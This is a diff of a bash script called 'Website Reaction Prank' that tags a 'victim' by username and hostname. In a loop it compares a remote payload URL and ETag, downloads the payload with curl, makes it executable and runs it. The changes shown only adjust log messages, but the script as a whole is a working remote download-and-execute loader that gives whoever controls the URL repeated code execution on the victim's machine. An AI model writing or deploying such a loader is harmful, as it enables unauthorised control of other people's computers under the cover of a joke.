@@ -3,12 +3,10 @@
 
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
-
 victim="$1"
 if [ -z "$victim" ]; then
   victim="$USER.`hostname`"
 fi
-echo "Victim ID: $victim"
 
 ###################################################################
  # Configuration variables
@@ -62,7 +60,7 @@ function getPayloadURL(){
 function downloadURL(){
   local url="$1"
   local outfile="$2"
-  echo "Downloading $url"
+  echo "downloadURL: Downloading $url"
   curl -s "$url" > "$outfile"
   chmod +x "$outfile"
 }
@@ -75,21 +73,21 @@ function downloadPayloadIfNeeded(){
   localURL=`head -n1 "$localPayloadURL"`
   localETag=`head -n1 "$localPayloadETag"`
 
-  echo "$localURL -> $remoteURL"
-  echo "$localETag -> $remoteURLETag"
+  echo "downloadPayloadIfNeeded: $localURL -> $remoteURL"
+  echo "downloadPayloadIfNeeded: $localETag -> $remoteURLETag"
 
     # We have a totally new URL, we should get it no matter what!
   if [ "$remoteURL" != "$localURL" ]; then
-    echo "We have a new URL!"
+    echo "downloadPayloadIfNeeded: We have a new URL!"
     downloadURL "$remoteURL" "$localPayloadLoc"
     echo "$remoteURL" > "$localPayloadURL"
     echo "$remoteURLETag" > "$localPayloadETag"
 
   else
-    echo "Same URL"
+    echo "downloadPayloadIfNeeded: Same URL"
 
     if [ "$localETag" != "$remoteURLETag" ]; then
-      echo "The payload has been updated!"
+      echo "downloadPayloadIfNeeded: The payload has been updated!"
       downloadURL "$remoteURL" "$localPayloadLoc"
       echo "$remoteURLETag" > "$localPayloadETag"
     fi
@@ -104,7 +102,8 @@ function runPayload() {
 ###################################################################
 
 echo "#################################"
-echo "# Website Reaction Prank        #"
+echo "# Website Reaction Prank         "
+echo "# VictimID: $victim              "
 echo "#################################"
 
 while [ true ]; do
